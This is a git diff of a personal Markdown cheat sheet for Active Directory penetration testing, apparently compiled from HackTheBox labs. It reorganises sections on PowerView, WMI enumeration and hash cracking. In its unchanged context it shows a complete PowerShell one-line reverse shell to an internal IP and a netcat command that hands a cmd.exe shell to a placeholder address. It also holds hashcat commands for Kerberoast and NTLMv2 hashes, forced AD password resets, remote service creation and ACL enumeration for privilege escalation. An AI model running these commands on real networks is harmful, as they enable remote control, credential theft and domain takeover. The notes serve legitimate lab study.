@@ -10,6 +10,10 @@
 - [ssh](#ssh)
 - [socat](#socat)
 - [TFTP](#tftp)
+- [nc](#nc)
+- [Windows Built-In](#windows-built-in)
+- [Powerview](#powerview)
+- [Metasploit](#metasploit)
 - [setspn](#setspn)
 - [samba](#samba)
   - [smbclient](#smbclient)
@@ -78,8 +82,8 @@ tag: Misc
 ```zsh
 $ hashcat -m 13100 bob_tgs /usr/share/wordlists/rockyou.txt
 $ hashcat -m 5600 era_ntlmv2 /usr/share/wordlists/rockyou.txt
-$ echo "backupagent::INLANEFREIGHT:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
-$ hashcat -m 5600 ./backupagent_hash /usr/share/wordlists/rockyou.txt
+$ echo "testuser::HOGEDOMAIN:9693dc33a27d0fad:65ED2DB3C8CABC535766CEEA790F5B90:0101000000000000005B16A7A85DDA0101783E12CBC277F00000000002000800560035003700380001001E00570049004E002D0041004D004C0035005400580048005A0031004D00340004003400570049004E002D0041004D004C0035005400580048005A0031004D0034002E0056003500370038002E004C004F00430041004C000300140056003500370038002E004C004F00430041004C000500140056003500370038002E004C004F00430041004C0007000800005B16A7A85DDA010600040002000000080030003000000000000000000000000030000046842C6450A0BA4C94522DF804CFB768388069149C8B2EE410B9FF7D91E1AF420A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000" > backupagent_hash
+$ hashcat -m 5600 ./testuser_hash /usr/share/wordlists/rockyou.txt
 $ hashcat -m 13100 ./SAPService_tgs /usr/share/wordlists/rockyou.txt
 ```
 
@@ -191,6 +195,16 @@ PS> $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
 PS> $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 # Reverse Shell - One Line
 PS> powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5,888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+# List SIDs for local users
+PS> Get-WmiObject Win32_UserAccount | Select-Object Name, SID
+# List SIDs for local groups
+PS> Get-WmiObject Win32_Group | Select-Object Name, SID
+# Service
+PS> Get-Service
+PS> Get-Service | ? {$_.DisplayName -like "*Hoge*"}
+# Share
+PS> Get-WmiObject Win32_Share | Select-Object Name, Path
+PS> Get-SmbShare | Select-Object Name, Path
 # Memo
 PS> if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators")) { Start-Process powershell.exe "-File `"$PSCommandPath`"" -Verb RunAs; exit }
 ```
@@ -201,11 +215,15 @@ PS> runas /netonly /user:HOGE.com\TestUser "c:\tools\nc64.exe -e cmd.exe XXX.XXX
 ```
 ## Import-Module ActiveDirectory
 ```powershell
-PS> Import-Module ActiveDirectory; $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force; Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
+PS> Import-Module ActiveDirectory
+# User
+PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+# 
+PS> $Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force; Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
 ```
 ## sc.exe
-```zsh
-$ sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
+```powershell
+PS> sc.exe \\TestHost/HOGE.com create TestService binPath= "%windir%\TestService.exe" start= auto
 ```
 
 ## certutil.exe
@@ -223,6 +241,22 @@ $ net user %username%
 tag: remote access
 ```powershell
 PS> winrs.exe -u:TestAdminUser -p:TestAdminPassword -r:TargetIP_or_Hostname cmd
+```
+
+# PowerView  
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
+```powershell
+PS> Import-Module .\PowerView.ps1
+# User
+PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+# Group
+PS> Get-DomainGroup -Identity "TestGroup" | select memberof
+# ACL
+PS> Find-InterestingDomainAcl
+PS> $TestUserSid = Convert-NameToSid TestUser
+PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $TestUserSid} -Verbose
+PS> $TestGroupSid = Convert-NameToSid "TestGroup"
+PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $TestGroupSid}
 ```
 
 # Metasploit
@@ -322,12 +356,10 @@ wmic os list brief
 
 whoami /user
 
-Get-WmiObject Win32_Account | Select-Object SID, Name
+
 
 tree c:\ /f | Select-String "Company" -context 20, 10
 
-Get-WmiObject Win32_Share | Select-Object Name, Path
-Get-SmbShare | Select-Object Name, Path
 
 
 New-SmbShare -Path c:\ -Name "Company Data" -FullAccess 'Everyone'
@@ -402,17 +434,7 @@ icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGro
 # Set NTFS permissions using icacls
 $subFolderPath = 'C:\Users\htb-student\Company Data\HR'; $securityGroupName = 'HR'; icacls $subFolderPath /remove "Users"; icacls $subFolderPath /inheritance:r; icacls $subFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
 
-##
-# List SIDs for local users
-Get-WmiObject Win32_UserAccount | Select-Object Name, SID
 
-# List SIDs for local groups
-Get-WmiObject Win32_Group | Select-Object Name, SID
-
-
-Get-Service
-
-Get-Service | ? {$_.DisplayName -like "*Update*"} 
 
 
 
@@ -511,8 +533,6 @@ PS> BloodHound.exe
 ## Check ... Analysis Tab
 ```
 
-# PowerView  
-https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 
 # Snaffer  
 https://github.com/SnaffCon/Snaffler  
@@ -600,25 +620,6 @@ $ cat sqldev_tgs_hashcat
 $ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 ```
 
-```ps
-PS> Find-InterestingDomainAcl
-PS> Import-Module .\PowerView.ps1
-# user : forend
-PS> $sid = Convert-NameToSid forend
-PS> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
-PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
-PS> Get-DomainGroup -Identity "Dagmar Payne" | select memberof
-PS> $itgroupsid = Convert-NameToSid "Information Technology"
-PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $itgroupsid} -Verbose
-
-PS> Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid} -Verbose
-
-Get-DomainObjectACL | ? {$_.SecurityIdentifier -eq $sid} -Verbose
-
-Allow-All
-
-```
-
 # DCSync
 ```ps
 # user: hoge
@@ -633,11 +634,9 @@ $ ls inlanefreight_hashes*
 ```
 ```ps
 PS> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
-PS> Import-Module .\PowerView.ps1
-PS> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+
 ```
 
-Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 
 
 
